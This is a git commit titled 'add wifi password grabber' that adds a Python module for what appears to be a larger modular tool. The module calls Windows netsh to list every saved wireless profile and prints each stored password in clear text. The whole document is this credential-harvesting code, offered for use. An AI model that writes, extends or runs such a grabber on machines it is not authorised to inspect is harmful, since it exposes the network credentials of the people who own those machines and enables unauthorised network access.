4ea2cc5b1ab72977291d2121975c2f22e48612fe
BerrieV1 <114003039+BerrieV1@users.noreply.github.com>
2023-05-19 16:32:35 +0200

    add wifi password grabber

---
+++ scripts/wifi_password.py
@@ -0,0 +1,21 @@
+from basemodule import BaseModule
+import subprocess
+
+
+class Wifi_password(BaseModule):
+    def run(self):
+        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
+        output = result.stdout
+        profile_names = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
+        for name in profile_names:
+            result = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True,
+                                    text=True)
+            output = result.stdout
+            password_line = [line.split(":")[1].strip() for line in output.split("\n") if "Key Content" in line]
+            if password_line:
+                password = password_line[0]
+                print(f"WiFi Name: {name}, Password: {password}")
+
+
+
+
